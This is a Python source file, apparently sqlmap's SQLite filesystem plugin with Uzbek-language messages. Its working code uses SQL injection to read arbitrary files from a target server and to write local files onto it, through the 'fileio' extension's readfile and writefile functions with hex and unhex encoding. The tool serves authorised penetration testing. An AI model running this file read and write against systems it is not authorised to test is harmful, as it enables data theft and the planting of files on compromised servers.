#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.data import logger
from lib.core.decorators import cachedmethod
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import PLACE
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.request import inject
from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    @cachedmethod
    def _checkFunction(self, name):
        """
        Checks for the presence of a specific SQL function inside the back-end
        DBMS (e.g. 'readfile'/'writefile' from the non-core 'fileio' extension,
        as the sqlite3 command line client has those built in, while the host
        application usually doesn't)
        """

        return inject.checkBooleanExpression("(SELECT COUNT(*) FROM pragma_function_list WHERE name='%s')>0" % name)

    def nonStackedReadFile(self, remoteFile):
        if not self._checkFunction("readfile"):
            errMsg = "SQLite da fayl o'qish uchun "
            errMsg += "'fileio' kengaytmasining 'readfile' funksiyasi "
            errMsg += "serverdagi DBMS ichida mavjud bo'lishi kerak"
            raise SqlmapUnsupportedFeatureException(errMsg)

        if not kb.bruteMode:
            infoMsg = "fayl olinmoqda: '%s'" % remoteFile
            logger.info(infoMsg)

        return inject.getValue("HEX(readfile('%s'))" % remoteFile, charsetType=CHARSET_TYPE.HEXADECIMAL)

    def stackedReadFile(self, remoteFile):
        return self.nonStackedReadFile(remoteFile)

    def nonStackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        if not self._checkFunction("writefile"):
            errMsg = 'SQLite da fayl yozish uchun '
            errMsg += "'fileio' kengaytmasining 'writefile' funksiyasi "
            errMsg += "serverdagi DBMS ichida mavjud bo'lishi kerak"
            raise SqlmapUnsupportedFeatureException(errMsg)

        logger.debug("fayl o'n oltilik matnga kodlanmoqda")

        fcEncodedList = self.fileEncode(localFile, "hex", True)
        fcEncodedStr = fcEncodedList[0][2:]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = 'inyeksiya GET parametrida va fayl '
            warnMsg += "yoziladigan o'n oltilik qiymat uzunligi %d " % fcEncodedStrLen
            warnMsg += 'bayt; bu faylni yozish '
            warnMsg += "jarayonida xatoga sabab bo'lishi mumkin"
            logger.warning(warnMsg)

        debugMsg = "%s fayli mazmuni '%s' fayliga chiqarilmoqda" % (fileType, remoteFile)
        logger.debug(debugMsg)

        # Note: 'unhex' (SQLite >= 3.41.0) keeps the write binary-safe; the hex
        # string survives sqlmap's string escaping (it becomes CHAR(...) of the
        # ASCII hex digits, which 'unhex' decodes back to the original bytes)
        if self._checkFunction("unhex"):
            content = "unhex('%s')" % fcEncodedStr
        else:
            warnMsg = "serverdagi DBMS da 'unhex' funksiyasi yo'q "
            warnMsg += '(SQLite >= 3.41.0); fayl matn qiymatidan yoziladi '
            warnMsg += "va ASCII bo'lmagan baytlar buzilishi mumkin"
            singleTimeWarnMessage(warnMsg)

            with open(localFile, "rb") as f:
                content = "'%s'" % f.read().decode("latin-1")

        inject.getValue("writefile('%s',%s)" % (remoteFile, content), expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        return self.nonStackedWriteFile(localFile, remoteFile, fileType, forceCheck)
